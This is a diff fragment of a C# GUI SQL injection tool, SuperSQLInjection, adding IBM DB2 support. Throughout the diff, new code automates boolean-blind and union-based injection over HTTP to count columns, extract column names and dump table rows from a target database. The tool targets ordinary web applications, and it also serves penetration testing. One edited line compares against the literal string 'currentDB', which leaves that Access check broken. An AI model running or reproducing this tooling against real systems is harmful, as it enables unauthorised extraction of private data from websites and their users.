+                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "column");
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
         /// 获取列名，union MySQL
         /// </summary>
         /// <param name="osn"></param>
@@ -3480,6 +3666,28 @@ namespace SuperSQLInjection
                 SelectNode sn = (SelectNode)osn;
 
                 String column_Name_data = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
+                String result = getOneDataByUnionOrError(column_Name_data);
+                this.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
+                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
+        /// 获取列名，union DB2
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getColumnNameByUnionByDB2(Object osn)
+        {
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+
+                String column_Name_data = DB2.getUnionDataValue(config.unionFillTemplate, DB2.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
                 String result = getOneDataByUnionOrError(column_Name_data);
                 this.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                 this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
@@ -3696,6 +3904,20 @@ namespace SuperSQLInjection
                                 }
                                 stp.WaitForIdle();
                                 break;
+                            case DBType.DB2:
+                                columns_count = getValueByStepUp(DB2.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
+                                this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
+                                for (int i = 1; i <= columns_count; i++)
+                                {
+                                    SelectNode sn = new SelectNode();
+                                    sn.tn = ctn;
+                                    sn.limit = i;
+                                    sn.tableName = tableName;
+                                    sn.dbname = dbName;
+                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByDB2, sn);
+                                }
+                                stp.WaitForIdle();
+                                break;
                         }
 
                     }
@@ -3796,6 +4018,24 @@ namespace SuperSQLInjection
                                     sn.tableName = tableName;
                                     sn.dbname = dbName;
                                     stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByPostgreSQL, sn);
+                                }
+                                stp.WaitForIdle();
+                                break;
+
+                            case DBType.DB2:
+                                columns_count_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.columns_count, dbName, tableName, "");
+                                result = getOneDataByUnionOrError(columns_count_payload);
+
+                                this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
+                                columns_count = Tools.convertToInt(result);
+                                for (int i = 1; i <= columns_count; i++)
+                                {
+                                    SelectNode sn = new SelectNode();
+                                    sn.tn = ctn;
+                                    sn.limit = i;
+                                    sn.tableName = tableName;
+                                    sn.dbname = dbName;
+                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByDB2, sn);
                                 }
                                 stp.WaitForIdle();
                                 break;
@@ -3901,6 +4141,9 @@ namespace SuperSQLInjection
                                     stp.QueueWorkItem<SelectNode>(getColumnNameByErrorByPostgreSQL, sn);
                                 }
                                 stp.WaitForIdle();
+                                break;
+                            case DBType.DB2:
+                                MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                                 break;
                         }
 
@@ -4395,8 +4638,6 @@ namespace SuperSQLInjection
                     for (int i = 1; i <= len; i++)
                     {
                         //取值payload，替换对应下标值
-                        //select UNICODE(substring(@@version,{index},1))
-                        //取值payload，替换对应下标值
                         String hex_data_payload = Oracle.hex_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                         //取unicode转换后的长度
                         String hex_data_len_payload = Oracle.bool_length.Replace("{data}", hex_data_payload);
@@ -4434,6 +4675,60 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
                 this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
+        /// 获取数据
+        /// </summary>
+        /// <param name="pams">列名集合List及limit等参数</param>
+        public void getDataValueByBoolByDB2(Object opam)
+        {
+            try
+            {
+
+                GetDataPam gp = (GetDataPam)opam;
+
+                ListViewItem lvi = null;
+
+                foreach (String columnName in gp.columns)
+                {
+                    //取每一列的值
+                    String data_payload = DB2.hex_value.Replace("{data}",DB2.getBoolDataPayLoad(columnName, gp.dbname, gp.table, gp.limit));
+                    String payload_len = DB2.bool_length.Replace("{data}", data_payload).Replace("{column}", columnName);
+
+                    int len = getValueByStepUp(payload_len, 0, 50);
+
+                    String value = "";
+                    StringBuilder hexs = new StringBuilder();
+                    //获取值
+                    for (int i = 1; i <= len; i++)
+                    {
+                            //获取多字节
+                            String substr_payload = DB2.bool_value.Replace("{data}", data_payload).Replace("{index}", i.ToString());
+                            //单个unicode值范围是数字或者大写字母，范围在48-90
+                            int ascii = getValue(substr_payload, 48, 90);
+                            hexs.Append((char)ascii);
+                    }
+                    value += Tools.hexToRaw(hexs.ToString(), config.db_encoding);
+                    if (lvi == null)
+                    {
+                        lvi = new ListViewItem(value);
+                    }
+                    else
+                    {
+                        lvi.SubItems.Add(value);
+                    }
+
+                }
+                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
+                this.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
             }
             Interlocked.Increment(ref this.currentDataCount);
         }
@@ -4526,6 +4821,29 @@ namespace SuperSQLInjection
             {
 
                 this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
+        /// 获取数据，union方式
+        /// </summary>
+        /// <param name="pams">列名集合List及limit等参数</param>
+        public void getDataValueByUnionByDB2(Object opam)
+        {
+            try
+            {
+                GetDataPam gp = (GetDataPam)opam;
+                ListViewItem lvi = new ListViewItem();
+                //每行数据只能获取最大值254个字符
+                String result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
+                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
+                this.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
             }
             Interlocked.Increment(ref this.currentDataCount);
         }
@@ -4728,66 +5046,6 @@ namespace SuperSQLInjection
                 this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
             }
             Interlocked.Increment(ref this.currentDataCount);
-            /*
-            try
-            {
-                GetDataPam gp = (GetDataPam)opam;
-
-                ListViewItem lvi = null;
-                foreach (String column in gp.columns)
-                {
-                    //获取数据长度
-
-                    String datas_payload_columns = Tools.creatMySQLColumnStr(column);
-                    String datas_payload_length = MySQL5.char_length.Replace("{data}", "hex(" + datas_payload_columns) + ") from " + gp.dbname + "." + gp.table + " limit " + gp.limit + ",1";
-
-                    String d_l_e = Tools.creatMySQLColumnStr("(" + datas_payload_length + ")");
-                    String datas_payload_length_error = MySQL5.error_value.Replace("{data}", d_l_e);
-
-                    String result_length = getOneDataByUnionOrError(datas_payload_length_error);
-
-                    int sumlen = Tools.convertToInt(result_length);
-                    String datas_value_payload = "(select " + Tools.creatMySQLColumnsStrByError(column, gp.table, gp.dbname, gp.limit) + ")";
-                    String result = "";
-                    int start = 1;
-                    //每次获取长度，err方式有长度限制
-                    int count = 64 - 6;
-                    this.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！",LogLevel.info);
-                    while (start < sumlen)
-                    {
-                        //hex编码，防止中文等乱码
-                        String datas_value_column = ByPassForBetween(Tools.creatMySQLColumnStr(MySQL5.substr_value.Replace("{data}", MySQL5.hex_value.Replace("{data}", datas_value_payload)).Replace("{start}", start.ToString())),count);
-                        String c_datas_value_payload = MySQL5.error_value.Replace("{data}", datas_value_column);
-                        result += getOneDataByUnionOrError(c_datas_value_payload);
-                        start += count;
-                    }
-                    //查找格式^^^col$$$col^^^
-                    result = Tools.unHex(result, config.db_encoding);
-                    Match m = Regex.Match(result, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
-                    if (m.Success)
-                    {
-                        result = m.Value;
-                    }
-
-                    if (lvi == null)
-                    {
-                        lvi = new ListViewItem(result);
-                    }
-                    else
-                    {
-                        lvi.SubItems.Add(result);
-                    }
-
-                }
-                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
-                this.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！",LogLevel.info);
-            }
-            catch (Exception e)
-            {
-
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
-            }*/
-
         }
 
         public void getDatasByBool(DBType dbtype, List<String> columns, int start, int dataCount)
@@ -4955,6 +5213,30 @@ namespace SuperSQLInjection
                         MessageBox.Show("没有这么多行数据，请改小点！");
                     }
                     break;
+                case DBType.DB2:
+                    isMax = findKeyInBody(DB2.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
+                    if (isMax)
+                    {
+                        for (int i = 1; i <= dataCount; i++)
+                        {
+                            GetDataPam gd = new GetDataPam();
+                            gd.columns = columns;
+                            gd.dbname = this.curren_db;
+                            gd.table = this.curren_table;
+                            gd.limit = start + i;
+                            gd.isMuStr = config.isMuStr;
+                            stp.WaitFor(100);
+                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByDB2, gd);
+                        }
+                        stp.WaitForIdle();
+                    }
+                    else
+                    {
+
+                        MessageBox.Show("没有这么多行数据，请改小点！");
+                    }
+
+                    break;
             }
 
         }
@@ -5086,6 +5368,9 @@ namespace SuperSQLInjection
                         stp.QueueWorkItem<GetDataPam>(getDataValueByErrorByPostgreSQL, gd);
                     }
                     stp.WaitForIdle();
+                    break;
+                case DBType.DB2:
+                    MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                     break;
             }
 
@@ -5244,6 +5529,34 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
+                case DBType.DB2:
+                    datas_count_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.data_count, this.curren_db, this.curren_table, "");
+                    result = getOneDataByUnionOrError(datas_count_payload);
+
+                    this.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);
+
+                    this.dataCount = Tools.convertToInt(result);
+
+                    if (this.dataCount < (dataCount + start))
+                    {
+                        this.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
+                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
+                        break;
+                    }
+                    //下标从1开始
+                    for (int i = 1; i <= dataCount; i++)
+                    {
+                        GetDataPam gd = new GetDataPam();
+                        gd.columns = columns;
+                        gd.dbname = this.curren_db;
+                        gd.table = this.curren_table;
+                        gd.limit = start + i;
+                        gd.isMuStr = config.isMuStr;
+                        stp.WaitFor(100);
+                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByDB2, gd);
+                    }
+                    stp.WaitForIdle();
+                    break;
             }
 
         }
@@ -5321,6 +5634,7 @@ namespace SuperSQLInjection
 
         private void data_cms_clearLog_Click(object sender, EventArgs e)
         {
+           
             Thread t = new Thread(Tools.delHTTPLog);
             t.Start();
             this.log_lvw_httpLog.Items.Clear();
@@ -5330,7 +5644,6 @@ namespace SuperSQLInjection
         public Thread injectThread = null;
         private void btn_autoInject_Click(object sender, EventArgs e)
         {
-            
             if (autoinject == 0)
             {
                 if (config.request.IndexOf("#inject#") != -1)
@@ -5629,7 +5942,7 @@ namespace SuperSQLInjection
                     //错误注入测试
                     this.Invoke(new showLogDelegate(log), "报告大侠，盲注测试完成，正在进行错误显示注入测试！", LogLevel.info);
 
-                    if (currentDB.Equals("Access"))
+                    if (DBType.Access.ToString().Equals("currentDB"))
                     {
 
                         this.Invoke(new showLogDelegate(log), "报告大侠，Access数据库不支持错误显示注入，已自动跳过！", LogLevel.info);
@@ -5689,18 +6002,18 @@ namespace SuperSQLInjection
 
                     //union注入
                     String payload = "";
-                    if ("MySQL".Equals(currentDB))
+                    if (DBType.MySQL.ToString().Equals(currentDB))
                     {
                         payload = unionStartPayLoad + "{payload}#";
                     }
-                    else if ("Access".Equals(currentDB))
+                    else if (DBType.Access.ToString().Equals(currentDB))
                     {
                         //处理%16不能被URL编码
                         payload = unionStartPayLoad + "{payload}";
                     }
                     else
                     {
-                        payload = unionStartPayLoad + "{payload}-- -";
+                        payload = unionStartPayLoad + "{payload}--";
 
                     }
                     //如果是已经识别出来bool注入，尝试使用orderby判断列数量，提高效率
@@ -5708,7 +6021,7 @@ namespace SuperSQLInjection
                     if (boolInject)
                     {
                         String orderpayload = " 1=1 order by {len}";
-                        if ("Access".Equals(currentDB))
+                        if (DBType.Access.ToString().Equals(currentDB))
                         {
                             //%16
                             orderpayload = orderpayload + HttpUtility.UrlDecode("%16",Encoding.UTF8);
@@ -5719,14 +6032,17 @@ namespace SuperSQLInjection
                         order = getValue(orderpayload, 1, config.maxClolumns);
                     }
                     int startIndex = 1;
+                    int endIndex = config.maxClolumns;
                     if (order-1>0) {
                         startIndex = order - 1;
+                        endIndex = startIndex;
                         this.Invoke(new showLogDelegate(log), "注入点支持order by判断，自动判断查询有"+ startIndex + "列！", LogLevel.success);  
                     }
 
                     //判断总列数
                     Boolean isFind = false;
-                    for (int i = startIndex; i <= config.maxClolumns; i++)
+
+                    for (int i = startIndex; i <= endIndex; i++)
                     {
                         if (isFind)
                         {
@@ -5736,11 +6052,11 @@ namespace SuperSQLInjection
 
                         String unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, basestr + ""));
 
-                        if ("Oracle".Equals(currentDB))
+                        if (DBType.Oracle.ToString().Equals(currentDB))
                         {
                             unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, "null"));
                         }
-                        if ("Access".Equals(currentDB))
+                        if (DBType.Access.ToString().Equals(currentDB))
                         {
                             //%16不能被URL编码
                             payload_request = request.Replace(strparam, payload_location + "%16");
@@ -5748,30 +6064,58 @@ namespace SuperSQLInjection
                         }
 
                        
-                        if ("Oracle".Equals(currentDB)|| "PostgreSQL".Equals(currentDB))
+                        if (DBType.Oracle.ToString().Equals(currentDB)|| DBType.PostgreSQL.ToString().Equals(currentDB) || DBType.DB2.ToString().Equals(currentDB))
                         {
                             for (int j = 1; j <= i; j++)
                             {
-                                if ("Oracle".Equals(currentDB))
+                                if (DBType.DB2.ToString().Equals(currentDB))
                                 {
-                                    unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+                                    if (isFind) {
+                                        break;
+                                    }
+                                    //获得所有组合情况
+                                    List<String> tp_list = Tools.getDB2UnionTemplates(i, j);
+                                    foreach (String tp in tp_list) {
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByDB2(tp, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+                                        ServerInfo cunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                                        if (cunionServer.code == 200 && cunionServer.body.IndexOf("1111111111") != -1)
+                                        {
+                                            isFind = true;
+                                            newParam = strparam.Replace(param, param + "<Encode>" + payload.Replace("{payload}", "#inject#") + "</Encode>");
+                                            unionInject = true;
+                                            selectInjectType(InjectType.Union);
+                                            this.txt_inject_unionTemplate.Text = tp;
+                                            break;
+                                        }
+                                    }
 
                                 }
-                                if ("PostgreSQL".Equals(currentDB)){
-                                    unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+
+                                else
+                                {
+                                    if (DBType.Oracle.ToString().Equals(currentDB))
+                                    {
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByOracle(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+
+                                    }
+
+                                    else if (DBType.PostgreSQL.ToString().Equals(currentDB))
+                                    {
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, j, "chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)||chr(49)"));
+                                    }
+                                    ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                                    if (unionServer.code == 200 && unionServer.body.IndexOf("1111111111") != -1)
+                                    {
+                                        isFind = true;
+                                        newParam = strparam.Replace(param, param + "<Encode>" + payload.Replace("{payload}", "#inject#") + "</Encode>");
+                                        unionInject = true;
+                                        selectInjectType(InjectType.Union);
+                                        this.txt_inject_unionColumnsCount.Text = i + "";
+                                        this.txt_inject_showIndex.Text = j + "";
+                                        break;
+                                    }
                                 }
 
-                                ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                                if (unionServer.code == 200 && unionServer.body.IndexOf("1111111111") != -1)
-                                {
-                                    isFind = true;
-                                    newParam = strparam.Replace(param, param + "<Encode>" + payload.Replace("{payload}", "#inject#") + "</Encode>");
-                                    unionInject = true;
-                                    selectInjectType(InjectType.Union);
-                                    this.txt_inject_unionColumnsCount.Text = i + "";
-                                    this.txt_inject_showColumn.Text = j + "";
-                                    break;
-                                }
                             }
                         }
                         else
@@ -5792,7 +6136,7 @@ namespace SuperSQLInjection
                                     selectInjectType(InjectType.Union);
                                     unionInject = true;
                                     this.txt_inject_unionColumnsCount.Text = i + "";
-                                    this.txt_inject_showColumn.Text = j + "";
+                                    this.txt_inject_showIndex.Text = j + "";
                                     break;
                                 }
                             }
@@ -6021,10 +6365,59 @@ namespace SuperSQLInjection
                
                 this.file_cbox_readWrite.Items.Clear();
                 this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");
-                
-                Tools.SysLog(ee.Message);
+                Tools.SysLog("info：方法不存在----："+ee.Message);
             }
             this.file_cbox_readWrite.SelectedIndex = 0;
+            //加载环境变量
+
+            loadVersToListView(config.dbType);
+
+            //DB2填充模板显示是否运行设置
+            if (DBType.DB2.Equals(config.dbType))
+            {
+                this.txt_inject_unionTemplate.Enabled = true;
+                this.txt_inject_unionColumnsCount.Enabled= false;
+                this.txt_inject_showIndex.Enabled = false;
+            }
+            else {
+                this.txt_inject_unionTemplate.Enabled = false;
+                this.txt_inject_unionColumnsCount.Enabled = true;
+                this.txt_inject_showIndex.Enabled = true;
+            }
+
+        }
+
+        public void loadVersToListView(DBType dbtype) {
+            List<String> vers = null;
+            switch (config.dbType)
+            {
+                case DBType.MySQL:
+                    vers = MySQL.vers;
+                    break;
+                case DBType.SQLServer:
+                    vers = SQLServer.vers;
+                    break;
+                case DBType.Oracle:
+                    vers = Oracle.vers;
+                    break;
+                case DBType.PostgreSQL:
+                    vers = PostgreSQL.vers;
+                    break;
+                case DBType.DB2:
+                    vers = DB2.vers;
+                    break;
+            }
+            this.data_lvw_ver.Items.Clear();
+            if (vers!=null&& vers.Count>0)
+            {
+                foreach (String ver in vers) {
+                    String[] cvers = ver.Split(':');
+                    ListViewItem lvi = new ListViewItem(cvers[0]);
+                    lvi.Tag = cvers[1];
+                    this.data_lvw_ver.Items.Add(lvi);
+                }
+            }
+
         }
         private void txt_inject_unionColumnsCount_TextChanged(object sender, EventArgs e)
         {
@@ -6037,9 +6430,9 @@ namespace SuperSQLInjection
 
         private void txt_inject_showColumn_TextChanged(object sender, EventArgs e)
         {
-            if (!String.IsNullOrEmpty(this.txt_inject_showColumn.Text))
+            if (!String.IsNullOrEmpty(this.txt_inject_showIndex.Text))
             {
-                config.showColumn = int.Parse(this.txt_inject_showColumn.Text);
+                config.showColumn = int.Parse(this.txt_inject_showIndex.Text);
             }
         }
 
@@ -6323,7 +6716,9 @@ namespace SuperSQLInjection
             this.chk_openURLEncoding.Checked = config.isOpenURLEncoding;
             this.chk_useSSL.Checked = config.useSSL;
             this.txt_inject_unionColumnsCount.Text = config.columnsCount + "";
-            this.txt_inject_showColumn.Text = config.showColumn + "";
+            this.txt_inject_showIndex.Text = config.showColumn + "";
+            this.txt_inject_unionTemplate.Text = config.unionFillTemplate;
+
 
             this.txt_inject_request.Text = config.request;
 
@@ -7480,26 +7875,6 @@ namespace SuperSQLInjection
         private void bypass_chk_inculdeStr_CheckedChanged(object sender, EventArgs e)
         {
             config.inculdeStr = this.bypass_chk_inculdeStr.Checked;
-        }
-
-        private void bypass_delselect_Click(object sender, EventArgs e)
-        {
-            if (this.bypass_lvw_replaceString.SelectedItems != null && this.bypass_lvw_replaceString.SelectedItems.Count > 0)
-            {
-                foreach (ListViewItem lvi in this.bypass_lvw_replaceString.SelectedItems)
-                {
-
-                    this.bypass_lvw_replaceString.Items.Remove(lvi);
-                    String delStr = lvi.SubItems[0].Text + "\t" + lvi.SubItems[1].Text + "\n";
-                    config.replaceStrs = config.replaceStrs.Replace(delStr, "");
-                    replaceList.Remove(lvi.SubItems[0].Text);
-
-                }
-            }
-            else
-            {
-                MessageBox.Show("没有选择！");
-            }
         }
 
         private void file_cbox_readWrite_SelectedIndexChanged(object sender, EventArgs e)
@@ -8995,6 +9370,51 @@ namespace SuperSQLInjection
                 this.file_btn_start.Enabled = true;
             }
             
+        }
+
+        private void data_cms_copyPaylaod_Click(object sender, EventArgs e)
+        {
+            if (this.log_lvw_httpLog.SelectedItems.Count == 0)
+            {
+                return;
+            }
+            Clipboard.SetText(this.log_lvw_httpLog.SelectedItems[0].SubItems[1].Text);
+            MessageBox.Show("复制成功！");
+        }
+
+        private void bypass_tsmi_delselect_Click(object sender, EventArgs e)
+        {
+            if (this.bypass_lvw_replaceString.SelectedItems != null && this.bypass_lvw_replaceString.SelectedItems.Count > 0)
+            {
+                foreach (ListViewItem lvi in this.bypass_lvw_replaceString.SelectedItems)
+                {
+
+                    this.bypass_lvw_replaceString.Items.Remove(lvi);
+                    String delStr = lvi.SubItems[0].Text + "\t" + lvi.SubItems[1].Text + "\n";
+                    config.replaceStrs = config.replaceStrs.Replace(delStr, "");
+                    replaceList.Remove(lvi.SubItems[0].Text);
+
+                }
+            }
+            else
+            {
+                MessageBox.Show("没有选择！");
+            }
+        }
+
+        private void bypass_tsmi_copy_Click(object sender, EventArgs e)
+        {
+            if (this.bypass_lvw_replaceString.SelectedItems.Count <= 0)
+            {
+                return;
+            }
+            Clipboard.SetText(this.bypass_lvw_replaceString.SelectedItems[0].SubItems[0].Text+"\t"+ this.bypass_lvw_replaceString.SelectedItems[0].SubItems[1].Text);
+            MessageBox.Show("复制成功！");
+        }
+
+        private void txt_inject_unionTemplate_TextChanged(object sender, EventArgs e)
+        {
+            config.unionFillTemplate = this.txt_inject_unionTemplate.Text;
         }
     }
 }
